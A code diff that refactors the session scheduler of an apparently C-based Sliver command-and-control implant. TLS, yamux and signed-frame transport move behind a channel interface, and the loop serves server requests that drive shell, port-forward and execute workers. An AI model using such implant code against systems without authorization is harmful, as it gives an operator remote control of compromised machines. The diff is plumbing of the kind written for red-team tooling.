@@ -1,99 +1,47 @@
-/* src/modes/session.c - interactive session loop over mtls. */
+/* src/modes/session.c - interactive session scheduler.
+ *
+ * Owns the session lifecycle only: register, accept-driven request/response and
+ * teardown. The wire pipeline (TLS, MUX/1, yamux, signed frames) lives behind
+ * sliver/channel.h so a second scheduler (beacon) and additional transports can
+ * reuse it unchanged.
+ */
 #include "sliver/session.h"
 
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 
-#include "sliver/frame.h"
+#include "sliver/channel.h"
 #include "sliver/log.h"
 #include "sliver/platform.h"
+#include "sliver/proto.h"
 #include "sliver/rpc.h"
-#include "sliver/transport.h"
-#include "sliver/yamux.h"
 
 #define SLIVER_HEARTBEAT_INTERVAL_MS 120000u
 #define SLIVER_HEARTBEAT_TICK_MS 200u
 
 typedef struct {
-  sliver_yamux_t *y;
-  uint32_t stream_id;
-  int failed;
-} session_stream_t;
-
-typedef struct {
-  sliver_yamux_t *y;
-  sliver_frame_signer_t *signer;
+  sliver_channel_t *ch;
   sliver_mutex_t *tx_lock;
   volatile int stop;
   volatile int closed;
 } session_tx_t;
 
-static long stream_read(void *ctx, void *buf, size_t len) {
-  session_stream_t *s = (session_stream_t *)ctx;
-  long n = sliver_yamux_read(s->y, s->stream_id, buf, len);
-  if (n < 0) {
-    s->failed = 1;
-  }
-  return n;
-}
-
-static long stream_write(void *ctx, const void *buf, size_t len) {
-  session_stream_t *s = (session_stream_t *)ctx;
-  if (sliver_yamux_write(s->y, s->stream_id, buf, len) != 0) {
-    s->failed = 1;
-    return -1;
-  }
-  return (long)len;
-}
-
-static long transport_read(void *ctx, void *buf, size_t len) {
-  sliver_transport_t *t = (sliver_transport_t *)ctx;
-  return t->read(t, buf, len);
-}
-
-static long transport_write(void *ctx, const void *buf, size_t len) {
-  sliver_transport_t *t = (sliver_transport_t *)ctx;
-  return t->write(t, buf, len);
-}
-
-/* Writes one signed envelope on a fresh stream and half-closes it. */
+/* Sends one already-built envelope through the channel. Serialised per session
+ * and refuses to touch the channel once teardown started. */
 static int send_envelope(session_tx_t *tx, const void *envelope, size_t len) {
-  session_stream_t stream;
-  uint32_t sid = 0;
   int rc;
 
   if (tx->tx_lock != NULL) {
     sliver_mutex_lock(tx->tx_lock);
   }
-  if (tx->closed) {
-    /* The session is tearing down: the yamux/signer pointers may already be
-     * stale. Never touch them after this flag is set (teardown sets it under the
-     * same lock before freeing the connection resources). */
+  if (tx->closed || tx->ch == NULL) {
     if (tx->tx_lock != NULL) {
       sliver_mutex_unlock(tx->tx_lock);
     }
     return -1;
   }
-  if (sliver_yamux_open(tx->y, &sid) != 0) {
-    if (!tx->stop && !tx->y->failed) {
-      LOG_ERROR("session: yamux open failed");
-    }
-    if (tx->tx_lock != NULL) {
-      sliver_mutex_unlock(tx->tx_lock);
-    }
-    return -1;
-  }
-  stream.y = tx->y;
-  stream.stream_id = sid;
-  stream.failed = 0;
-  rc = sliver_frame_write(tx->signer, stream_write, &stream, envelope, len);
-  if (rc != 0) {
-    LOG_ERROR("session: frame write failed (stream %u, %u bytes)", sid, (unsigned)len);
-  } else {
-    LOG_DEBUG("session: sent envelope on stream %u (%u bytes)", sid, (unsigned)len);
-  }
-  (void)sliver_yamux_close_write(tx->y, sid);
+  rc = tx->ch->send(tx->ch, envelope, len);
   if (tx->tx_lock != NULL) {
     sliver_mutex_unlock(tx->tx_lock);
   }
@@ -109,7 +57,7 @@ static int encode_unknown_reply(sliver_buf_t *out, int64_t id) {
   return sliver_buf_put_bool(out, 4, 1);
 }
 
-/* Lets the shell module push TunnelData frames through the same sender. */
+/* Lets the shell and portfwd modules push frames through the same sender. */
 static session_tx_t *g_tx = NULL;
 
 static int rpc_send_adapter(int64_t envelope_id, uint32_t type, const void *data, size_t len) {
@@ -181,9 +129,7 @@ static void heartbeat_thread(void *arg) {
 }
 
 int sliver_session_run(const sliver_session_config_t *cfg) {
-  sliver_transport_t *transport = NULL;
-  sliver_yamux_t yamux;
-  sliver_frame_signer_t signer;
+  sliver_channel_t *ch = NULL;
   sliver_buf_t reg_buf, env_buf;
   sliver_register_t reg;
   /* Static: detached workers may hold a stale &tx past this function's return,
@@ -193,7 +139,6 @@ int sliver_session_run(const sliver_session_config_t *cfg) {
   sliver_thread_t *heartbeat = NULL;
   char err[256];
   int rc = -1;
-  int yamux_ready = 0;
 
   if (cfg == NULL || cfg->host == NULL || cfg->ca_pem == NULL ||
       cfg->age_private_key == NULL || cfg->server_minisign_pubkey == NULL) {
@@ -203,35 +148,19 @@ int sliver_session_run(const sliver_session_config_t *cfg) {
   sliver_buf_init(&reg_buf);
   sliver_buf_init(&env_buf);
 
-  if (sliver_frame_signer_init(&signer, cfg->age_private_key) != 0) {
-    LOG_ERROR("session: cannot derive envelope signing key");
-    return -1;
-  }
-
   err[0] = '\0';
-  if (sliver_transport_connect(&transport, cfg->host, cfg->port, cfg->ca_pem,
-                               cfg->cert_pem, cfg->key_pem, err, sizeof(err)) != 0) {
+  if (sliver_channel_dial(cfg->host, cfg->port, cfg->ca_pem, cfg->cert_pem, cfg->key_pem,
+                          cfg->age_private_key, cfg->server_minisign_pubkey, &ch, err,
+                          sizeof(err)) != 0) {
     LOG_ERROR("session: %s", err);
     return -1;
   }
-  LOG_INFO("session: handshake ok (%s / %s)", transport->version(transport),
-           transport->ciphersuite(transport));
-
-  if (transport->write(transport, SLIVER_YAMUX_PREFACE, SLIVER_YAMUX_PREFACE_LEN) !=
-      SLIVER_YAMUX_PREFACE_LEN) {
-    LOG_ERROR("session: MUX/1 write failed");
-    goto out;
-  }
-  if (sliver_yamux_client(&yamux, transport_read, transport_write, transport) != 0) {
-    goto out;
-  }
-  yamux_ready = 1;
+  LOG_INFO("session: handshake ok (%s)", ch->describe(ch));
 
   if (tx_lock == NULL) {
     tx_lock = sliver_mutex_create();
   }
-  tx.y = &yamux;
-  tx.signer = &signer;
+  tx.ch = ch;
   tx.tx_lock = tx_lock;
   tx.stop = 0;
   tx.closed = 0;
@@ -263,31 +192,26 @@ int sliver_session_run(const sliver_session_config_t *cfg) {
 
   /* Serve server initiated streams until the connection dies. */
   for (;;) {
-    uint32_t sid = 0;
-    session_stream_t stream;
     sliver_envelope_t envelope;
     sliver_rpc_result_t result = {0};
+    int r;
 
-    if (sliver_yamux_accept(&yamux, &sid) != 0) {
+    r = ch->recv(ch, &env_buf);
+    if (r == 1) {
       /* Not a clean end: the caller must reconnect (the Go implant retries). */
       LOG_INFO("session: connection closed");
       rc = -1;
       break;
     }
-    stream.y = &yamux;
-    stream.stream_id = sid;
-    stream.failed = 0;
-
-    if (sliver_frame_read(cfg->server_minisign_pubkey, stream_read, &stream, &env_buf) != 0) {
-      LOG_WARN("session: bad frame on stream %u", sid);
-      (void)sliver_yamux_close_write(&yamux, sid);
+    if (r < 0) {
+      sliver_buf_free(&env_buf);
+      sliver_buf_init(&env_buf);
       continue;
     }
     if (sliver_envelope_decode(env_buf.data, env_buf.len, &envelope) != 0) {
-      LOG_WARN("session: bad envelope on stream %u", sid);
+      LOG_WARN("session: bad envelope");
       sliver_buf_free(&env_buf);
       sliver_buf_init(&env_buf);
-      (void)sliver_yamux_close_write(&yamux, sid);
       continue;
     }
 
@@ -328,21 +252,19 @@ int sliver_session_run(const sliver_session_config_t *cfg) {
     }
     sliver_buf_free(&env_buf);
     sliver_buf_init(&env_buf);
-    (void)sliver_yamux_close_write(&yamux, sid);
   }
 
 out:
   tx.stop = 1;
   sliver_shell_shutdown();
   sliver_portfwd_shutdown();
-  /* Mark the sender closed under the lock so any in-flight send_envelope finishes
-   * first, then null the pointers it would otherwise touch after the yamux/signer
-   * below are freed. */
+  /* Mark the sender closed under the lock so any in-flight send_envelope
+   * finishes first, then drop the channel reference it would otherwise touch
+   * after the channel is freed below. */
   if (tx.tx_lock != NULL) {
     sliver_mutex_lock(tx.tx_lock);
     tx.closed = 1;
-    tx.y = NULL;
-    tx.signer = NULL;
+    tx.ch = NULL;
     g_tx = NULL;
     sliver_mutex_unlock(tx.tx_lock);
   } else {
@@ -354,25 +276,11 @@ out:
   }
   /* Do NOT destroy tx_lock here: detached workers (shell reader, portfwd relay,
    * execute/file workers) may still be in send_envelope() holding a reference to
-   * the session tx/tx_lock. Destroying the lock freed memory another thread was
-   * about to enter (use-after-free). One leaked mutex per process is the safe
-   * trade; the connection resources below are still torn down. */
+   * the session tx/tx_lock. One leaked mutex per process is the safe trade. */
   sliver_buf_free(&reg_buf);
   sliver_buf_free(&env_buf);
-  if (yamux_ready) {
-    sliver_yamux_free(&yamux);
-  }
-  if (transport != NULL) {
-    sliver_transport_free(transport);
+  if (ch != NULL) {
+    sliver_channel_free(ch);
   }
   return rc;
 }
-
-
-
-
-
-
-
-
-
